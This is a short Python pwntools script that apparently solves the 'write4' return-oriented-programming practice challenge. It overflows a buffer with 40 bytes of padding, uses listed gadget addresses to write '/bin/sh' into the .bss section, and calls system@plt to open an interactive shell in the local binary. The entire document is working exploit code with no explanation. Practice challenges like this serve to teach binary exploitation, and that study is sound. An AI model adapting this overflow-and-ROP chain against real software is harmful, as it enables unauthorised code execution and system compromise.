from pwn import *

#0x0000000000400820 : mov qword ptr [r14], r15 ; ret
#0x0000000000400890 : pop r14 ; pop r15 ; ret
#0x0000000000400893 : pop rdi ; ret

#00000000004005e0 <system@plt>:
#[26] .bss    NOBITS   0000000000601060  00001060  0000000000000030

p = process("./write4")

ppr = p64(0x400890)
mr = p64(0x400820)
pr = p64(0x400893)

sys_addr = p64(0x4005e0)
bss_addr = p64(0x601060)

junk = "A" * 40
payload = junk + ppr + bss_addr + "/bin/sh\x00" + mr +\
          pr + bss_addr + sys_addr 

p.recvuntil('> ')
p.sendline(payload)
p.interactive()
